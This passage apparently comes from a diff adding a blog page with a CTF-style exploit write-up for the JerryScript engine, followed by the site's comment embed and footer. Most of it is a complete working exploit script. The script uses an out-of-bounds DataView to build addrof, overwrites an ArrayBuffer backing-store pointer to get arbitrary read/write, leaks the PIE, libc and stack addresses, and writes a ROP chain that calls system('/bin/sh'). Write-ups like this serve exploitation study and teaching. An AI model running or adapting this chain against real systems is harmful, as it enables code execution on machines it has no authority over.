+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> got <span style="color:#ff7b72;font-weight:bold">=</span> ptr <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x70dc0</span>n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;pie base: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr)
+</span></span></code></pre></div><h3 id="arbitrary-rw">
+  Arbitrary r/w
+  <a class="heading-link" href="#arbitrary-rw">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Well, now you&rsquo;d typically craft a <code>fakeobj</code> primitive. Problem is that we are absolutely clueless about the full internal structure of objects in the jerryscript engine. We tried analyzing <code>ArrayBuffers</code>, and the only thing we could notice is the uncompressed pointer to it&rsquo;s data, similar to <code>BackingStore</code> in v8. We will not include our failed attempts on creating a <code>fakeobj</code> primitive. We decided to stop messing with the stupid assertion errors and did something else.</p>
+<p>We can just allocate an <code>ArrayBuffer</code>, find the offset with our <code>addrof</code> primitive and then use thee OOB to change the data pointer to a location we desire:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">var</span> target <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> ArrayBuffer(<span style="color:#a5d6ff">0x10000</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> target_view <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Uint32Array(target);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x41414141</span>
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">1</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x42424242</span>
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">2</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x43434343</span>
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">3</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x44444444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> offset2 <span style="color:#ff7b72;font-weight:bold">=</span> addrof(target) <span style="color:#ff7b72;font-weight:bold">-</span> addrof(buffer)
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> ptr2 <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getBigInt64(offset2, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;backing store: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dataView.setBigInt64(offset2, got, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>ptr2 <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getBigInt64(offset2, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;backing store modified: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr2)
+</span></span></code></pre></div><p>After quickly confirming the offset of the data pointer inside the <code>ArrayBuffer</code> object, we see the correct backing store being leaked and modified. Accessing the <code>ArrayBuffer</code> confirms our arbitrary read/write! From now on it&rsquo;s an easy game.
+We leaked libc from the GOT of jerryscript, the stack from <code>environ</code>, and wrote a ROP chain on the stack and GG!</p>
+<h3 id="final-exploit">
+  Final exploit
+  <a class="heading-link" href="#final-exploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">const</span> buffer <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> ArrayBuffer(<span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> dataView <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> DataView(buffer, <span style="color:#79c0ff">NaN</span>, <span style="color:#a5d6ff">0x10000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> a <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Array(<span style="color:#a5d6ff">128</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">let</span> i<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">0</span>; i<span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#a5d6ff">128</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>	a[i] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4242</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> fake_idx <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xffffffff</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> off <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">let</span> i<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">0</span>; i<span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#a5d6ff">0x500</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">const</span> ptr <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getUint32(i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">if</span>(ptr <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0x42420</span>) {
+</span></span><span style="display:flex;"><span>		print(<span style="color:#a5d6ff">&#34;found &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34; at offset &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		off <span style="color:#ff7b72;font-weight:bold">=</span> i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">8</span>;
+</span></span><span style="display:flex;"><span>		dataView.setUint32(off, <span style="color:#a5d6ff">0x43430</span>, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">let</span> j<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">0</span>; j<span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#a5d6ff">128</span>; j<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#ff7b72">if</span>(a[j] <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0x4343</span>) {
+</span></span><span style="display:flex;"><span>				print(<span style="color:#a5d6ff">&#34;found overlapping idx &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> j);
+</span></span><span style="display:flex;"><span>				fake_idx <span style="color:#ff7b72;font-weight:bold">=</span> j;
+</span></span><span style="display:flex;"><span>				<span style="color:#ff7b72">break</span>
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">if</span>(fake_idx <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#a5d6ff">0xffffffff</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#ff7b72">break</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">function</span> addrof(obj) {
+</span></span><span style="display:flex;"><span>	a[fake_idx] <span style="color:#ff7b72;font-weight:bold">=</span> obj;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">var</span> tagged <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getUint32(off, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>	a[fake_idx] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4242</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">return</span> (tagged <span style="color:#ff7b72;font-weight:bold">&amp;</span> (<span style="color:#ff7b72;font-weight:bold">~</span><span style="color:#a5d6ff">3</span>))
+</span></span><span style="display:flex;"><span>}  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// exploit goes here...
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> buf <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> ArrayBuffer(<span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> f64_buf <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Float64Array(buf);
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> u64_buf <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Uint32Array(buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">function</span> ftoi(val) { <span style="color:#8b949e;font-style:italic">// typeof(val) = float
+</span></span></span><span style="display:flex;"><span>	f64_buf[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:bold">=</span> val;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">return</span> BigInt(u64_buf[<span style="color:#a5d6ff">0</span>]) <span style="color:#ff7b72;font-weight:bold">+</span> (BigInt(u64_buf[<span style="color:#a5d6ff">1</span>]) <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">32</span>n); <span style="color:#8b949e;font-style:italic">// Watch for little endianness
+</span></span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">function</span> itof(val) { <span style="color:#8b949e;font-style:italic">// typeof(val) = BigInt
+</span></span></span><span style="display:flex;"><span>	u64_buf[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(val <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xffffffff</span>n);
+</span></span><span style="display:flex;"><span>	u64_buf[<span style="color:#a5d6ff">1</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(val <span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span> <span style="color:#a5d6ff">32</span>n);
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">return</span> f64_buf[<span style="color:#a5d6ff">0</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> offset <span style="color:#ff7b72;font-weight:bold">=</span> addrof(dataView) <span style="color:#ff7b72;font-weight:bold">-</span> addrof(buffer)
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> ptr <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getBigInt64(offset, <span style="color:#79c0ff">true</span>) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x72588</span>n;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> got <span style="color:#ff7b72;font-weight:bold">=</span> ptr <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x70dc0</span>n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;pie base: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> target <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> ArrayBuffer(<span style="color:#a5d6ff">0x10000</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> target_view <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Uint32Array(target);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">0</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x41414141</span>
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">1</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x42424242</span>
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">2</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x43434343</span>
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">3</span>] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x44444444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> offset2 <span style="color:#ff7b72;font-weight:bold">=</span> addrof(target) <span style="color:#ff7b72;font-weight:bold">-</span> addrof(buffer)
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> ptr2 <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getBigInt64(offset2, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;backing store: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dataView.setBigInt64(offset2, got, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>ptr2 <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getBigInt64(offset2, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;backing store modified: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr2)
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> libc <span style="color:#ff7b72;font-weight:bold">=</span> (BigInt(target_view[<span style="color:#a5d6ff">1</span>]) <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">32</span>n) <span style="color:#ff7b72;font-weight:bold">+</span> BigInt(target_view[<span style="color:#a5d6ff">0</span>]) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x224a00</span>n <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0xed700</span>n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;libc base: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> libc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> environ <span style="color:#ff7b72;font-weight:bold">=</span> libc <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x34a2d0</span>n <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x13f578</span>n;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> pop_rdi <span style="color:#ff7b72;font-weight:bold">=</span> libc <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x10f78b</span>n;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> ret <span style="color:#ff7b72;font-weight:bold">=</span> pop_rdi <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x1</span>n;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> system <span style="color:#ff7b72;font-weight:bold">=</span> libc <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x58750</span>n;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> binsh <span style="color:#ff7b72;font-weight:bold">=</span> libc <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x1cb42f</span>n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dataView.setBigInt64(offset2, environ, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ptr2 <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getBigInt64(offset2, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;backing store modified: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> stack <span style="color:#ff7b72;font-weight:bold">=</span> (BigInt(target_view[<span style="color:#a5d6ff">1</span>]) <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">32</span>n) <span style="color:#ff7b72;font-weight:bold">+</span> BigInt(target_view[<span style="color:#a5d6ff">0</span>]) <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x138</span>n <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x270</span>n <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x8</span>n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;stack: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> stack)
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>dataView.setBigInt64(offset2, stack, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>ptr3 <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getBigInt64(offset2, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;backing store modified: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">2</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(ret <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xffffffff</span>n)
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">3</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(ret <span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span> <span style="color:#a5d6ff">32</span>n)
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">4</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(pop_rdi <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xffffffff</span>n)
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">5</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(pop_rdi <span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span> <span style="color:#a5d6ff">32</span>n)
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">6</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(binsh <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xffffffff</span>n)
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">7</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(binsh <span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span> <span style="color:#a5d6ff">32</span>n)
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">8</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(system <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#a5d6ff">0xffffffff</span>n)
+</span></span><span style="display:flex;"><span>target_view[<span style="color:#a5d6ff">9</span>] <span style="color:#ff7b72;font-weight:bold">=</span> Number(system <span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span> <span style="color:#a5d6ff">32</span>n)
+</span></span><span style="display:flex;"><span><span style="color:#f85149">´´´</span>
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     bitfriends 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
